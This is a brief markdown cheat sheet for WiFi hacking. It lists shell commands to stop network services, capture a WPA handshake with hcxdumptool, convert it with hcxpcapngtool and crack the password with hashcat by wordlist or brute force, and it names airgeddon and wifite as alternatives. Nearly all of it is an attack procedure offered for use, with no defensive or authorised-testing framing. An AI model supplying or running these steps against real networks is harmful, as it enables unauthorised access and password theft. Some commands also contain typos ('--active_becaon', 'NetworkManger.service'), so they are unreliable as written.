# WiFi Hacking

## Capture handshake (manually)

1. Disable network applications
   ```sh
   sudo systemctl stop NetworkManager.service
   sudo systemctl stop wpa_supplicant.service
   ```
2. Find mac addresses
   ```sh
   sudo hcxdumptool --do_rcascan -i wlan0
   ```
3. Capture traffic
   ```sh
   sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_becaon
   ```
4. Enable network applications
   ```sh
   sudo systemctl start NetworkManger.service
   sudo systemctl start wpa_supplicant.service
   ```
5. Decode capture
   ```sh
   hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
   ```
6. Filter contents
   Filter `essidlist` contents and keep the ones that contain the desired mac address.
   Delete the others or create a new file with the target info.

_Alternatively we can use tools like [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) and [wifite](https://github.com/kimocoder/wifite2)._

## Cracking the hash

### Using word list

```sh
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Brute force

```sh
hashcat -m 22000 hash.hc22000 -a 3 --increment --increment-min 6 --increment-max 20 ?a
```

_Use the same command with --show to output the password._
